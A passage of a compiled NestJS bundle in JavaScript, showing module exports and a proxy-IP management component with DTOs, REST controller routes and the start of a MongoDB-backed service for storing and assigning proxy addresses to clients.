    __param(0, (0, mongoose_1.InjectModel)(dynamic_data_schema_1.DynamicData.name)),
    __param(1, (0, mongoose_3.InjectConnection)()),
    __metadata("design:paramtypes", [mongoose_2.Model, mongoose.Connection, npoint_service_1.NpointService])
], DynamicDataService);


/***/ }),

/***/ "./src/components/dynamic-data/index.ts":
/*!**********************************************!*\
  !*** ./src/components/dynamic-data/index.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./dynamic-data.controller */ "./src/components/dynamic-data/dynamic-data.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./dynamic-data.service */ "./src/components/dynamic-data/dynamic-data.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./dynamic-data.module */ "./src/components/dynamic-data/dynamic-data.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./dynamic-data.schema */ "./src/components/dynamic-data/dynamic-data.schema.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto/create-dynamic-data.dto */ "./src/components/dynamic-data/dto/create-dynamic-data.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto/update-dynamic-data.dto */ "./src/components/dynamic-data/dto/update-dynamic-data.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto/get-dynamic-data.dto */ "./src/components/dynamic-data/dto/get-dynamic-data.dto.ts"), exports);


/***/ }),

/***/ "./src/components/index.ts":
/*!*********************************!*\
  !*** ./src/components/index.ts ***!
  \*********************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./active-channels */ "./src/components/active-channels/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./buffer-clients */ "./src/components/buffer-clients/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./builds */ "./src/components/builds/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./channels */ "./src/components/channels/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./clients */ "./src/components/clients/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./ConfigurationInit */ "./src/components/ConfigurationInit/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./n-point */ "./src/components/n-point/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./session-manager */ "./src/components/session-manager/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./stats */ "./src/components/stats/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./stats2 */ "./src/components/stats2/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./promote-stats */ "./src/components/promote-stats/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./promote-clients */ "./src/components/promote-clients/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./promote-msgs */ "./src/components/promote-msgs/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./user-data */ "./src/components/user-data/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./users */ "./src/components/users/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./Telegram */ "./src/components/Telegram/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./TgSignup */ "./src/components/TgSignup/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./ip-management */ "./src/components/ip-management/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./timestamps */ "./src/components/timestamps/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./transactions */ "./src/components/transactions/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./upi-ids */ "./src/components/upi-ids/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./shared */ "./src/components/shared/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./dynamic-data */ "./src/components/dynamic-data/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./bots */ "./src/components/bots/index.ts"), exports);


/***/ }),

/***/ "./src/components/ip-management/dto/create-proxy-ip.dto.ts":
/*!*****************************************************************!*\
  !*** ./src/components/ip-management/dto/create-proxy-ip.dto.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateProxyIpDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreateProxyIpDto {
}
exports.CreateProxyIpDto = CreateProxyIpDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '192.168.1.100', description: 'IP address of the proxy' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateProxyIpDto.prototype, "ipAddress", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 8080, description: 'Port number of the proxy' }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], CreateProxyIpDto.prototype, "port", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'http', description: 'Protocol type', enum: ['http', 'https', 'socks5'] }),
    (0, class_validator_1.IsEnum)(['http', 'https', 'socks5']),
    __metadata("design:type", String)
], CreateProxyIpDto.prototype, "protocol", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'username', description: 'Username for proxy authentication', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateProxyIpDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'password', description: 'Password for proxy authentication', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateProxyIpDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'active', description: 'Status of the proxy IP', enum: ['active', 'inactive'], required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(['active', 'inactive']),
    __metadata("design:type", String)
], CreateProxyIpDto.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'client1', description: 'Client ID that owns this IP', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateProxyIpDto.prototype, "assignedToClient", void 0);


/***/ }),

/***/ "./src/components/ip-management/dto/search-ip.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/ip-management/dto/search-ip.dto.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchIpMobileMappingDto = exports.SearchProxyIpDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchProxyIpDto {
}
exports.SearchProxyIpDto = SearchProxyIpDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '192.168.1.100', description: 'IP address to search for', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchProxyIpDto.prototype, "ipAddress", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 8080, description: 'Port number to search for', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchProxyIpDto.prototype, "port", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'http', description: 'Protocol type to search for', enum: ['http', 'https', 'socks5'], required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(['http', 'https', 'socks5']),
    __metadata("design:type", String)
], SearchProxyIpDto.prototype, "protocol", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'US', description: 'Country code to search for', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchProxyIpDto.prototype, "country", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'active', description: 'Status to search for', enum: ['active', 'inactive', 'blocked', 'maintenance'], required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(['active', 'inactive', 'blocked', 'maintenance']),
    __metadata("design:type", String)
], SearchProxyIpDto.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Whether to search for assigned or unassigned IPs', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchProxyIpDto.prototype, "isAssigned", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'client1', description: 'Client ID to search for', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchProxyIpDto.prototype, "assignedToClient", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'DataCenter', description: 'Provider to search for', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchProxyIpDto.prototype, "provider", void 0);
class SearchIpMobileMappingDto {
}
exports.SearchIpMobileMappingDto = SearchIpMobileMappingDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '916265240911', description: 'Mobile number to search for', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchIpMobileMappingDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '192.168.1.100:8080', description: 'IP address to search for', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchIpMobileMappingDto.prototype, "ipAddress", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'client1', description: 'Client ID to search for', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchIpMobileMappingDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'active', description: 'Status to search for', enum: ['active', 'inactive'], required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(['active', 'inactive']),
    __metadata("design:type", String)
], SearchIpMobileMappingDto.prototype, "status", void 0);


/***/ }),

/***/ "./src/components/ip-management/dto/update-proxy-ip.dto.ts":
/*!*****************************************************************!*\
  !*** ./src/components/ip-management/dto/update-proxy-ip.dto.ts ***!
  \*****************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateProxyIpDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_proxy_ip_dto_1 = __webpack_require__(/*! ./create-proxy-ip.dto */ "./src/components/ip-management/dto/create-proxy-ip.dto.ts");
class UpdateProxyIpDto extends (0, swagger_1.PartialType)(create_proxy_ip_dto_1.CreateProxyIpDto) {
}
exports.UpdateProxyIpDto = UpdateProxyIpDto;


/***/ }),

/***/ "./src/components/ip-management/index.ts":
/*!***********************************************!*\
  !*** ./src/components/ip-management/index.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./ip-management.module */ "./src/components/ip-management/ip-management.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./ip-management.service */ "./src/components/ip-management/ip-management.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./ip-management.controller */ "./src/components/ip-management/ip-management.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./schemas/proxy-ip.schema */ "./src/components/ip-management/schemas/proxy-ip.schema.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto/create-proxy-ip.dto */ "./src/components/ip-management/dto/create-proxy-ip.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto/update-proxy-ip.dto */ "./src/components/ip-management/dto/update-proxy-ip.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto/search-ip.dto */ "./src/components/ip-management/dto/search-ip.dto.ts"), exports);


/***/ }),

/***/ "./src/components/ip-management/ip-management.controller.ts":
/*!******************************************************************!*\
  !*** ./src/components/ip-management/ip-management.controller.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.IpManagementController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const ip_management_service_1 = __webpack_require__(/*! ./ip-management.service */ "./src/components/ip-management/ip-management.service.ts");
const create_proxy_ip_dto_1 = __webpack_require__(/*! ./dto/create-proxy-ip.dto */ "./src/components/ip-management/dto/create-proxy-ip.dto.ts");
const update_proxy_ip_dto_1 = __webpack_require__(/*! ./dto/update-proxy-ip.dto */ "./src/components/ip-management/dto/update-proxy-ip.dto.ts");
const proxy_ip_schema_1 = __webpack_require__(/*! ./schemas/proxy-ip.schema */ "./src/components/ip-management/schemas/proxy-ip.schema.ts");
let IpManagementController = class IpManagementController {
    constructor(ipManagementService) {
        this.ipManagementService = ipManagementService;
    }
    async createProxyIp(createProxyIpDto) {
        try {
            return await this.ipManagementService.createProxyIp(createProxyIpDto);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async bulkCreateProxyIps(proxyIps) {
        try {
            return await this.ipManagementService.bulkCreateProxyIps(proxyIps);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async getAllProxyIps() {
        try {
            return await this.ipManagementService.findAllProxyIps();
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async updateProxyIp(ipAddress, port, updateProxyIpDto) {
        try {
            return await this.ipManagementService.updateProxyIp(ipAddress, parseInt(port), updateProxyIpDto);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async deleteProxyIp(ipAddress, port) {
        try {
            await this.ipManagementService.deleteProxyIp(ipAddress, parseInt(port));
            return { message: 'Proxy IP deleted successfully' };
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async getHealthStatus() {
        try {
            return await this.ipManagementService.healthCheck();
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async getProxyIpById(ipAddress, port) {
        try {
            return await this.ipManagementService.findProxyIpById(ipAddress, parseInt(port));
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async getClientAssignedIps(clientId) {
        try {
            return await this.ipManagementService.getClientAssignedIps(clientId);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async getAvailableIpCount() {
        try {
            const count = await this.ipManagementService.getAvailableIpCount();
            return { count };
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
};
exports.IpManagementController = IpManagementController;
__decorate([
    (0, common_1.Post)('proxy-ips'),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new proxy IP' }),
    (0, swagger_1.ApiBody)({ type: create_proxy_ip_dto_1.CreateProxyIpDto }),
    (0, swagger_1.ApiOkResponse)({ description: 'Proxy IP created successfully', type: proxy_ip_schema_1.ProxyIp }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Invalid input data' }),
    (0, swagger_1.ApiConflictResponse)({ description: 'Proxy IP already exists' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_proxy_ip_dto_1.CreateProxyIpDto]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "createProxyIp", null);
__decorate([
    (0, common_1.Post)('proxy-ips/bulk'),
    (0, swagger_1.ApiOperation)({ summary: 'Bulk create proxy IPs' }),
    (0, swagger_1.ApiBody)({ type: [create_proxy_ip_dto_1.CreateProxyIpDto] }),
    (0, swagger_1.ApiOkResponse)({ description: 'Bulk creation completed' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Array]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "bulkCreateProxyIps", null);
__decorate([
    (0, common_1.Get)('proxy-ips'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all proxy IPs' }),
    (0, swagger_1.ApiOkResponse)({ description: 'Proxy IPs retrieved successfully', type: [proxy_ip_schema_1.ProxyIp] }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "getAllProxyIps", null);
__decorate([
    (0, common_1.Put)('proxy-ips/:ipAddress/:port'),
    (0, swagger_1.ApiOperation)({ summary: 'Update a proxy IP' }),
    (0, swagger_1.ApiParam)({ name: 'ipAddress', description: 'IP address' }),
    (0, swagger_1.ApiParam)({ name: 'port', description: 'Port number' }),
    (0, swagger_1.ApiBody)({ type: update_proxy_ip_dto_1.UpdateProxyIpDto }),
    (0, swagger_1.ApiOkResponse)({ description: 'Proxy IP updated successfully', type: proxy_ip_schema_1.ProxyIp }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Proxy IP not found' }),
    __param(0, (0, common_1.Param)('ipAddress')),
    __param(1, (0, common_1.Param)('port')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, update_proxy_ip_dto_1.UpdateProxyIpDto]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "updateProxyIp", null);
__decorate([
    (0, common_1.Delete)('proxy-ips/:ipAddress/:port'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete a proxy IP' }),
    (0, swagger_1.ApiParam)({ name: 'ipAddress', description: 'IP address' }),
    (0, swagger_1.ApiParam)({ name: 'port', description: 'Port number' }),
    (0, swagger_1.ApiOkResponse)({ description: 'Proxy IP deleted successfully' }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Proxy IP not found' }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Cannot delete assigned IP' }),
    __param(0, (0, common_1.Param)('ipAddress')),
    __param(1, (0, common_1.Param)('port')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "deleteProxyIp", null);
__decorate([
    (0, common_1.Get)('health'),
    (0, swagger_1.ApiOperation)({ summary: 'Get IP management health status' }),
    (0, swagger_1.ApiOkResponse)({ description: 'Health status retrieved successfully' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "getHealthStatus", null);
__decorate([
    (0, common_1.Get)('proxy-ips/:ipAddress/:port'),
    (0, swagger_1.ApiOperation)({ summary: 'Get a specific proxy IP' }),
    (0, swagger_1.ApiParam)({ name: 'ipAddress', description: 'IP address' }),
    (0, swagger_1.ApiParam)({ name: 'port', description: 'Port number' }),
    (0, swagger_1.ApiOkResponse)({ description: 'Proxy IP found', type: proxy_ip_schema_1.ProxyIp }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Proxy IP not found' }),
    __param(0, (0, common_1.Param)('ipAddress')),
    __param(1, (0, common_1.Param)('port')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "getProxyIpById", null);
__decorate([
    (0, common_1.Get)('clients/:clientId/assigned-ips'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all IPs assigned to a client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiOkResponse)({ description: 'Client assigned IPs retrieved successfully', type: [proxy_ip_schema_1.ProxyIp] }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "getClientAssignedIps", null);
__decorate([
    (0, common_1.Get)('available-count'),
    (0, swagger_1.ApiOperation)({ summary: 'Get count of available IPs' }),
    (0, swagger_1.ApiOkResponse)({ description: 'Available IP count retrieved successfully' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], IpManagementController.prototype, "getAvailableIpCount", null);
exports.IpManagementController = IpManagementController = __decorate([
    (0, swagger_1.ApiTags)('IP Management'),
    (0, common_1.Controller)('ip-management'),
    __metadata("design:paramtypes", [ip_management_service_1.IpManagementService])
], IpManagementController);


/***/ }),

/***/ "./src/components/ip-management/ip-management.module.ts":
/*!**************************************************************!*\
  !*** ./src/components/ip-management/ip-management.module.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.IpManagementModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const ip_management_controller_1 = __webpack_require__(/*! ./ip-management.controller */ "./src/components/ip-management/ip-management.controller.ts");
const ip_management_service_1 = __webpack_require__(/*! ./ip-management.service */ "./src/components/ip-management/ip-management.service.ts");
const proxy_ip_schema_1 = __webpack_require__(/*! ./schemas/proxy-ip.schema */ "./src/components/ip-management/schemas/proxy-ip.schema.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const promote_client_module_1 = __webpack_require__(/*! ../promote-clients/promote-client.module */ "./src/components/promote-clients/promote-client.module.ts");
let IpManagementModule = class IpManagementModule {
};
exports.IpManagementModule = IpManagementModule;
exports.IpManagementModule = IpManagementModule = __decorate([
    (0, common_1.Module)({
        imports: [
            mongoose_1.MongooseModule.forFeature([
                { name: proxy_ip_schema_1.ProxyIp.name, schema: proxy_ip_schema_1.ProxyIpSchema },
            ]),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
            (0, common_1.forwardRef)(() => promote_client_module_1.PromoteClientModule)
        ],
        controllers: [ip_management_controller_1.IpManagementController],
        providers: [ip_management_service_1.IpManagementService],
        exports: [ip_management_service_1.IpManagementService]
    })
], IpManagementModule);


/***/ }),

/***/ "./src/components/ip-management/ip-management.service.ts":
/*!***************************************************************!*\
  !*** ./src/components/ip-management/ip-management.service.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var IpManagementService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.IpManagementService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const proxy_ip_schema_1 = __webpack_require__(/*! ./schemas/proxy-ip.schema */ "./src/components/ip-management/schemas/proxy-ip.schema.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
let IpManagementService = IpManagementService_1 = class IpManagementService {
    constructor(proxyIpModel) {
        this.proxyIpModel = proxyIpModel;
        this.logger = new utils_1.Logger(IpManagementService_1.name);
    }
    async createProxyIp(createProxyIpDto) {
        if (!createProxyIpDto.ipAddress || !createProxyIpDto.port) {
            throw new common_1.BadRequestException('IP address and port are required');
        }
        if (createProxyIpDto.port < 1 || createProxyIpDto.port > 65535) {
            throw new common_1.BadRequestException('Port must be between 1 and 65535');
        }
        this.logger.debug(`Creating new proxy IP: ${createProxyIpDto.ipAddress}:${createProxyIpDto.port}`);
        try {
            const existingIp = await this.proxyIpModel.findOne({
                ipAddress: createProxyIpDto.ipAddress,
                port: createProxyIpDto.port
            });
            if (existingIp) {
                throw new common_1.ConflictException(`Proxy IP ${createProxyIpDto.ipAddress}:${createProxyIpDto.port} already exists`);
            }
            const createdIp = new this.proxyIpModel(createProxyIpDto);
            const savedIp = await createdIp.save();
            this.logger.log(`Created proxy IP: ${savedIp.ipAddress}:${savedIp.port}`);
            return savedIp.toJSON();
        }
        catch (error) {
            if (error instanceof common_1.ConflictException || error instanceof common_1.BadRequestException) {
                throw error;
            }
            this.logger.error(`Failed to create proxy IP ${createProxyIpDto.ipAddress}:${createProxyIpDto.port}: ${error.message}`);
            throw new common_1.BadRequestException(`Failed to create proxy IP: ${error.message}`);
        }
    }
    async bulkCreateProxyIps(proxyIps) {
        if (!proxyIps || proxyIps.length === 0) {
